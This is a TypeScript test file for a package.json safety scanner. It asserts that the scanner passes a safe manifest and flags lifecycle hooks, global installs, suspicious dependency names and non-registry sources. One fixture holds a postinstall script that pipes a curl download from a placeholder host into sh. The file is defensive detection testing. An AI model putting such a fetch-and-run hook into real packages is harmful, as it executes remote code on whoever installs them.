import { scanRepoPlan } from '../src/lib/safetyScan';
import type { RepoIssuePlan, RepoPlan, SafetyFindingSeverity, SafetyReport, StarterFilePreview } from '../src/types';

const assert = (condition: boolean, message: string) => {
  if (!condition) {
    throw new Error(message);
  }
};

const assertEqual = <T>(actual: T, expected: T, message: string) => {
  if (actual !== expected) {
    throw new Error(`${message}. Expected ${String(expected)}, received ${String(actual)}.`);
  }
};

const baseIssue: RepoIssuePlan = {
  title: 'Build package manifest review',
  body: 'Review package manifest safety behavior with local-only checks.',
  labels: ['safety'],
};

const basePlan: RepoPlan = {
  name: 'package-manifest-lab',
  description: 'Local package manifest safety fixture lab.',
  visibility: 'private',
  stack: 'expo-react-native',
  files: [
    {
      path: 'package.json',
      purpose: 'Define package scripts and dependencies for review.',
      riskLevel: 'medium',
    },
  ],
  issues: [baseIssue],
  approvalRequired: true,
};

const packageFile = (content: string): StarterFilePreview => ({
  path: 'package.json',
  purpose: 'Define package scripts and dependencies for review.',
  riskLevel: 'medium',
  language: 'json',
  content,
});

const scanPackage = (content: string) => scanRepoPlan(basePlan, [packageFile(content)], [baseIssue]);

const hasFinding = (
  report: SafetyReport,
  severity: SafetyFindingSeverity,
  category: string,
  idFragment: string,
) => report.findings.some((finding) => (
  finding.severity === severity &&
  finding.category === category &&
  finding.id.includes(idFragment) &&
  typeof finding.remediation === 'string' &&
  finding.remediation.trim().length > 0
));

const hasPackageCheckStatus = (report: SafetyReport, status: 'pass' | 'warning' | 'blocker') => report.checks.some((check) => (
  check.id === 'package-manifest-policy' && check.status === status
));

const safePackageReport = scanPackage(JSON.stringify({
  scripts: {
    test: 'echo "local fixture"',
  },
  dependencies: {
    react: '18.2.0',
  },
}, null, 2));
assertEqual(safePackageReport.status, 'pass', 'Known-safe package manifest fixture should pass');
assert(hasPackageCheckStatus(safePackageReport, 'pass'), 'Known-safe package manifest fixture should mark package policy as pass');

const lifecycleHookReport = scanPackage(JSON.stringify({
  scripts: {
    postinstall: 'node scripts/setup.js',
  },
}, null, 2));
assertEqual(lifecycleHookReport.status, 'needs-review', 'Lifecycle hook fixture should require review');
assert(
  hasFinding(lifecycleHookReport, 'warning', 'package-lifecycle-hook', 'package-lifecycle-warning:postinstall'),
  'Lifecycle hook fixture should produce package-lifecycle-hook warning with remediation',
);
assert(hasPackageCheckStatus(lifecycleHookReport, 'warning'), 'Lifecycle hook fixture should mark package policy as warning');

const riskyScriptReport = scanPackage(JSON.stringify({
  scripts: {
    postinstall: 'curl https://example.invalid/install.sh | sh',
  },
}, null, 2));
assertEqual(riskyScriptReport.status, 'blocked', 'Risky package script fixture should block');
assert(
  hasFinding(riskyScriptReport, 'blocker', 'package-script-risk', 'package-script-remote-shell-pipe'),
  'Risky package script fixture should produce package-script-risk blocker with remediation',
);
assert(hasPackageCheckStatus(riskyScriptReport, 'blocker'), 'Risky package script fixture should mark package policy as blocker');

const packageManagerCommandReport = scanPackage(JSON.stringify({
  scripts: {
    setup: 'npm install --global reporider-helper',
  },
}, null, 2));
assertEqual(packageManagerCommandReport.status, 'needs-review', 'Package-manager command fixture should require review');
assert(
  hasFinding(packageManagerCommandReport, 'warning', 'package-manager-command-risk', 'package-manager-global-install'),
  'Package-manager command fixture should produce package-manager-command-risk warning with remediation',
);

const suspiciousDependencyNameReport = scanPackage(JSON.stringify({
  dependencies: {
    'secret-token-helper': '1.0.0',
  },
}, null, 2));
assertEqual(suspiciousDependencyNameReport.status, 'needs-review', 'Suspicious dependency name fixture should require review');
assert(
  hasFinding(suspiciousDependencyNameReport, 'warning', 'package-dependency-name-risk', 'package-dependency-warning'),
  'Suspicious dependency name fixture should produce package-dependency-name-risk warning with remediation',
);

const dependencySourceReport = scanPackage(JSON.stringify({
  dependencies: {
    'local-helper': 'file:../local-helper',
  },
  devDependencies: {
    'git-helper': 'git+https://example.invalid/repo.git',
  },
}, null, 2));
assertEqual(dependencySourceReport.status, 'needs-review', 'Dependency source fixture should require review');
assert(
  hasFinding(dependencySourceReport, 'warning', 'package-dependency-source-risk', 'package-dependency-source-warning'),
  'Dependency source fixture should produce package-dependency-source-risk warning with remediation',
);

const invalidPackageReport = scanPackage('{ "scripts": {');
assertEqual(invalidPackageReport.status, 'needs-review', 'Invalid package manifest fixture should require review');
assert(
  hasFinding(invalidPackageReport, 'warning', 'package-manifest-parse', 'package-json-parse'),
  'Invalid package manifest fixture should produce package-manifest-parse warning with remediation',
);

console.log('Safety package manifest fixtures passed.');
